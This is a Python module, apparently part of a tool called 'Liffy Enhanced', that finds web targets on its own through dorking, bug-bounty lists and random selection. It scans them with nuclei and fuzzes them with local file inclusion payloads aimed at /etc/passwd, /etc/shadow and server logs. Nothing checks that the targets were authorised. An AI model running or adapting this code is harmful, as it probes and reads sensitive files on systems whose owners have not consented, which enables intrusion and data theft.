#!/usr/bin/env python3
"""
Hunt Mode Module for Liffy Enhanced
Handles automatic target hunting and discovery when no arguments are provided
"""

import os
import sys
import json
import subprocess
import time
from pathlib import Path
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
import random

from target_discovery import TargetDiscoveryEngine, DiscoveryMethod, TargetInfo
from setup_tools import ToolSetup

@dataclass
class HuntConfig:
    """Configuration for hunt mode"""
    max_targets: int = 20
    discovery_methods: List[DiscoveryMethod] = None
    categories: List[str] = None
    technologies: List[str] = None
    enable_nuclei: bool = True
    enable_log4j: bool = True
    enable_fuzzing: bool = True
    output_dir: str = "~/MyWork/hunt_results"

class HuntMode:
    """Main hunt mode class"""
    
    def __init__(self):
        self.config = HuntConfig()
        self.discovery_engine = TargetDiscoveryEngine()
        self.tool_setup = ToolSetup()
        self.targets = []
        self.results = []
        
    def setup_environment(self):
        """Setup hunt environment"""
        print("🔧 Setting up hunt environment...")
        
        # Setup tools if not already done
        if not self._check_tools_setup():
            print("📦 Setting up required tools...")
            self.tool_setup.setup_all()
        
        # Create output directory
        output_dir = Path(self.config.output_dir).expanduser()
        output_dir.mkdir(parents=True, exist_ok=True)
        
        print(f"✅ Hunt environment ready")
        print(f"📁 Output directory: {output_dir}")
    
    def _check_tools_setup(self) -> bool:
        """Check if tools are already set up"""
        work_dir = Path.home() / "MyWork"
        return work_dir.exists() and (work_dir / "tools").exists()
    
    def discover_targets(self):
        """Discover targets using multiple methods"""
        print("\n🔍 Starting target discovery...")
        print("=" * 50)
        
        all_targets = []
        
        # Discovery methods to try
        methods = [
            DiscoveryMethod.DORKING,
            DiscoveryMethod.BUG_BOUNTY,
            DiscoveryMethod.RANDOM
        ]
        
        for method in methods:
            print(f"\n🎯 Using {method.value} discovery...")
            try:
                targets = self.discovery_engine.discover_targets(
                    method=method,
                    max_results=self.config.max_targets // len(methods)
                )
                all_targets.extend(targets)
                print(f"✅ Found {len(targets)} targets via {method.value}")
            except Exception as e:
                print(f"❌ Error with {method.value}: {e}")
        
        # Remove duplicates and shuffle
        unique_targets = self._deduplicate_targets(all_targets)
        random.shuffle(unique_targets)
        
        self.targets = unique_targets[:self.config.max_targets]
        
        print(f"\n🎉 Total unique targets discovered: {len(self.targets)}")
        return self.targets
    
    def _deduplicate_targets(self, targets: List[TargetInfo]) -> List[TargetInfo]:
        """Remove duplicate targets"""
        seen_urls = set()
        unique_targets = []
        
        for target in targets:
            if target.url not in seen_urls:
                seen_urls.add(target.url)
                unique_targets.append(target)
        
        return unique_targets
    
    def scan_with_nuclei(self):
        """Scan targets with nuclei"""
        if not self.config.enable_nuclei:
            return
        
        print("\n🎯 Running nuclei scans...")
        
        # Check if nuclei is available
        if not self._check_nuclei():
            print("❌ Nuclei not found, skipping nuclei scans")
            return
        
        nuclei_results = []
        
        for i, target in enumerate(self.targets[:10]):  # Limit to first 10 targets
            print(f"🔍 Scanning target {i+1}/{min(10, len(self.targets))}: {target.url}")
            
            try:
                # Run nuclei scan
                result = self._run_nuclei_scan(target.url)
                if result:
                    nuclei_results.append({
                        'target': target.url,
                        'method': target.method.value,
                        'confidence': target.confidence,
                        'nuclei_results': result
                    })
            except Exception as e:
                print(f"❌ Error scanning {target.url}: {e}")
        
        self.results.extend(nuclei_results)
        print(f"✅ Nuclei scans completed: {len(nuclei_results)} targets scanned")
    
    def _check_nuclei(self) -> bool:
        """Check if nuclei is available"""
        try:
            result = subprocess.run(['nuclei', '-version'], capture_output=True, text=True)
            return result.returncode == 0
        except:
            return False
    
    def _run_nuclei_scan(self, target_url: str) -> Optional[Dict]:
        """Run nuclei scan on target"""
        try:
            # Get custom templates path
            custom_templates = Path.home() / "MyWork" / "templates" / "nuclei-templates" / "custom"
            
            if not custom_templates.exists():
                return None
            
            # Run nuclei with custom templates
            cmd = [
                'nuclei',
                '-u', target_url,
                '-t', str(custom_templates),
                '-json',
                '-silent'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0 and result.stdout.strip():
                # Parse JSON results
                results = []
                for line in result.stdout.strip().split('\n'):
                    try:
                        results.append(json.loads(line))
                    except:
                        continue
                return results
            
        except Exception as e:
            print(f"Error running nuclei: {e}")
        
        return None
    
    def fuzz_targets(self):
        """Fuzz discovered targets"""
        if not self.config.enable_fuzzing:
            return
        
        print("\n🔍 Starting target fuzzing...")
        
        fuzz_results = []
        
        for i, target in enumerate(self.targets[:5]):  # Limit to first 5 targets
            print(f"🔍 Fuzzing target {i+1}/{min(5, len(self.targets))}: {target.url}")
            
            try:
                # Basic fuzzing with common LFI payloads
                fuzz_result = self._fuzz_target(target)
                if fuzz_result:
                    fuzz_results.append({
                        'target': target.url,
                        'method': target.method.value,
                        'confidence': target.confidence,
                        'fuzz_results': fuzz_result
                    })
            except Exception as e:
                print(f"❌ Error fuzzing {target.url}: {e}")
        
        self.results.extend(fuzz_results)
        print(f"✅ Fuzzing completed: {len(fuzz_results)} targets fuzzed")
    
    def _fuzz_target(self, target: TargetInfo) -> Optional[Dict]:
        """Fuzz a single target"""
        try:
            import requests
            
            # Common LFI payloads
            payloads = [
                "../../../../etc/passwd",
                "....//....//....//....//etc/passwd",
                "php://filter/read=convert.base64-encode/resource=../../../../etc/passwd",
                "../../../../etc/hosts",
                "../../../../etc/shadow",
                "../../../../var/log/apache2/access.log",
                "../../../../var/log/nginx/access.log"
            ]
            
            # Common LFI parameters
            params = ['file', 'page', 'path', 'doc', 'folder', 'inc', 'locate', 'menu']
            
            results = []
            
            for param in params:
                for payload in payloads:
                    try:
                        # Construct test URL
                        if '?' in target.url:
                            test_url = f"{target.url}&{param}={payload}"
                        else:
                            test_url = f"{target.url}?{param}={payload}"
                        
                        # Make request
                        response = requests.get(test_url, timeout=10)
                        
                        # Check for LFI indicators
                        if self._check_lfi_response(response.text):
                            results.append({
                                'param': param,
                                'payload': payload,
                                'status_code': response.status_code,
                                'response_length': len(response.text)
                            })
                    
                    except Exception:
                        continue
            
            return results if results else None
            
        except Exception as e:
            print(f"Error fuzzing {target.url}: {e}")
            return None
    
    def _check_lfi_response(self, response_text: str) -> bool:
        """Check if response indicates LFI vulnerability"""
        lfi_indicators = [
            'root:x:0:0:',
            'daemon:x:1:1:',
            'bin:x:2:2:',
            'sys:x:3:3:',
            '127.0.0.1',
            'localhost',
            'cm9vdDp4OjA6MDo=',  # base64 encoded root:x:0:0:
        ]
        
        return any(indicator in response_text for indicator in lfi_indicators)
    
    def generate_report(self):
        """Generate hunt report"""
        print("\n📊 Generating hunt report...")
        
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_targets': len(self.targets),
            'total_results': len(self.results),
            'targets': [
                {
                    'url': target.url,
                    'method': target.method.value,
                    'confidence': target.confidence,
                    'source': target.source,
                    'category': target.category,
                    'parameters': target.parameters,
                    'technology': target.technology,
                    'notes': target.notes
                }
                for target in self.targets
            ],
            'results': self.results
        }
        
        # Save report
        output_dir = Path(self.config.output_dir).expanduser()
        report_file = output_dir / f"hunt_report_{int(time.time())}.json"
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"✅ Report saved to: {report_file}")
        
        # Print summary
        self._print_summary(report)
    
    def _print_summary(self, report: Dict):
        """Print hunt summary"""
        print("\n" + "=" * 60)
        print("🎯 HUNT MODE SUMMARY")
        print("=" * 60)
        print(f"📅 Timestamp: {report['timestamp']}")
        print(f"🎯 Targets Discovered: {report['total_targets']}")
        print(f"🔍 Results Generated: {report['total_results']}")
        
        # Group by discovery method
        methods = {}
        for target in report['targets']:
            method = target['method']
            if method not in methods:
                methods[method] = 0
            methods[method] += 1
        
        print(f"\n📊 Discovery Methods:")
        for method, count in methods.items():
            print(f"  - {method}: {count} targets")
        
        # Show top targets by confidence
        top_targets = sorted(report['targets'], key=lambda x: x['confidence'], reverse=True)[:5]
        print(f"\n🏆 Top Targets by Confidence:")
        for i, target in enumerate(top_targets, 1):
            print(f"  {i}. {target['url']} (confidence: {target['confidence']:.2f})")
        
        print("\n🎉 Hunt completed successfully!")
    
    def run_hunt(self):
        """Run complete hunt process"""
        print("🚀 Starting Liffy Enhanced Hunt Mode")
        print("=" * 60)
        
        # Setup environment
        self.setup_environment()
        
        # Discover targets
        targets = self.discover_targets()
        
        if not targets:
            print("❌ No targets discovered. Exiting.")
            return
        
        # Scan with nuclei
        self.scan_with_nuclei()
        
        # Fuzz targets
        self.fuzz_targets()
        
        # Generate report
        self.generate_report()

def main():
    """Main hunt mode function"""
    hunt = HuntMode()
    hunt.run_hunt()

if __name__ == "__main__":
    main()
